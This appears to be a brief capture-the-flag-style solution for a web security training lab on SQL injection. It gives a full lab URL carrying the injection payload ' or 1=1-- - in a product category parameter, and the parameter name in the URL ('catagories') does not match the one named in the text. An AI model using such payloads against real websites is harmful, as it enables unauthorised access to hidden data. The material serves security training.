# Retrieving Hidden Data

### Solution

The `categories` query parameter is vulnerable to a basic SQL Injection vulnerability. The solution is to this is:

```
https://<random-id>.web-security-academy.net/products?catagories=Accessories' or 1=1-- -
```
